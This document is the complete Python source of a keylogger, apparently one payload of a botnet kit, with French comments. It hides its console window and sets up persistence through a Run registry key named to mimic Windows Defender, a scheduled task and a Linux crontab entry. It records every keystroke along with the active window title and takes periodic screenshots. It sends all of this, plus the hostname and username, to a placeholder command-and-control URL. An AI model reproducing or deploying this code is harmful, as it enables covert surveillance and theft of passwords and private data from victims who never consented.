#!/usr/bin/env python3
"""
payloads/keylogger_win.py
Keylogger Windows — capture toutes les frappes
sur tout le PC, screenshots, persistence auto.
Variables : FILL_C2_URL FILL_C2_HOST FILL_PORT
"""
import os, sys, json, time, socket
import platform, threading, datetime
import urllib.request

C2     = "FILL_C2_URL"
BOT_ID = socket.gethostname()
BUFFER = []
LOCK   = threading.Lock()

# ── cacher la fenêtre ────────────────────────────────────
def hide():
    if platform.system() != "Windows":
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

# ── persistence ──────────────────────────────────────────
def install_persistence():
    exe = (sys.executable
           if getattr(sys, "frozen", False)
           else os.path.abspath(__file__))
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows"
                r"\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(
                key, "WindowsDefenderSvc",
                0, winreg.REG_SZ, f"pythonw {exe}"
            )
            winreg.CloseKey(key)
        except Exception:
            pass
        try:
            import subprocess
            subprocess.run(
                f'schtasks /create /sc onlogon '
                f'/tn "WinDefSvc" '
                f'/tr "pythonw {exe}" /f /rl highest',
                shell=True, capture_output=True,
            )
        except Exception:
            pass
    elif platform.system() == "Linux":
        try:
            import subprocess
            subprocess.run(
                f'(crontab -l 2>/dev/null; '
                f'echo "@reboot python3 {exe}") '
                f'| crontab -',
                shell=True, capture_output=True,
            )
        except Exception:
            pass

# ── envoi C2 ─────────────────────────────────────────────
def _post(url: str, data: dict):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def register():
    _post(f"{C2}/c2/register", {
        "id":   BOT_ID,
        "os":   platform.platform(),
        "user": os.getlogin(),
        "type": "keylogger_win",
    })

# ── fenêtre active ───────────────────────────────────────
def get_active_window() -> str:
    if platform.system() != "Windows":
        return "unknown"
    try:
        import ctypes
        hwnd   = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf    = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(
            hwnd, buf, length + 1)
        return buf.value[:60]
    except Exception:
        return "unknown"

# ── flush buffer → C2 ────────────────────────────────────
def flush_loop():
    while True:
        time.sleep(30)
        with LOCK:
            if not BUFFER:
                continue
            data = list(BUFFER)
            BUFFER.clear()
        text = ""
        last_win = ""
        for entry in data:
            win = entry.get("window", "")
            if win != last_win:
                text += f"\n[{win}]\n"
                last_win = win
            text += entry.get("key", "")
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[KEYLOG]\n{text}"
        })

# ── screenshot ───────────────────────────────────────────
def screenshot_loop():
    try:
        import base64, io
        from PIL import ImageGrab
    except ImportError:
        return
    while True:
        time.sleep(60)
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=40)
            b64 = base64.b64encode(
                buf.getvalue()).decode()
            _post(f"{C2}/frame", {
                "type":  "screen_keylogger",
                "frame": f"data:image/jpeg;base64,{b64}",
                "ts":    datetime.datetime.now().isoformat(),
                "ua":    f"Windows/{BOT_ID}",
            })
        except Exception:
            pass

# ── keylogger pynput ─────────────────────────────────────
def keylogger_pynput():
    try:
        from pynput import keyboard
        SPECIAL = {
            "space":     " ",
            "enter":     "\n",
            "backspace": "[⌫]",
            "tab":       "[TAB]",
            "delete":    "[DEL]",
            "escape":    "[ESC]",
            "caps_lock": "[CAPS]",
            "ctrl_l": "", "ctrl_r": "",
            "alt_l":  "", "alt_r":  "",
            "shift":  "", "shift_r":"",
            "cmd":    "[WIN]",
        }
        def on_press(key):
            win = get_active_window()
            try:
                char = key.char or ""
            except AttributeError:
                name = str(key).replace("Key.", "")
                char = SPECIAL.get(name, f"[{name}]")
            with LOCK:
                BUFFER.append({
                    "key":    char,
                    "window": win,
                    "ts":     datetime.datetime.now()
                              .strftime("%H:%M:%S"),
                })
        with keyboard.Listener(
            on_press=on_press
        ) as listener:
            listener.join()
    except ImportError:
        keylogger_ctypes()

# ── fallback ctypes ──────────────────────────────────────
def keylogger_ctypes():
    if platform.system() != "Windows":
        return
    import ctypes, string
    VK_MAP = {}
    for c in string.ascii_uppercase:
        VK_MAP[ord(c)] = c.lower()
    for d in string.digits:
        VK_MAP[ord(d)] = d
    VK_MAP.update({
        0x20:" ",   0x0D:"\n",   0x08:"[⌫]",
        0x09:"[TAB]",0x2E:"[DEL]",0x1B:"[ESC]",
        0xBE:".",   0xBC:",",   0xBF:"/",
        0xBA:";",   0xBB:"=",   0xBD:"-",
    })
    pressed = set()
    while True:
        win = get_active_window()
        for vk, char in VK_MAP.items():
            state = ctypes.windll.user32\
                    .GetAsyncKeyState(vk)
            if state & 0x8000:
                if vk not in pressed:
                    pressed.add(vk)
                    with LOCK:
                        BUFFER.append({
                            "key":    char,
                            "window": win,
                            "ts":     datetime.datetime
                                      .now()
                                      .strftime("%H:%M:%S"),
                        })
            else:
                pressed.discard(vk)
        time.sleep(0.01)

# ── main ─────────────────────────────────────────────────
if __name__ == "__main__":
    hide()
    register()
    install_persistence()
    threading.Thread(
        target=flush_loop, daemon=True).start()
    threading.Thread(
        target=screenshot_loop, daemon=True).start()
    keylogger_pynput()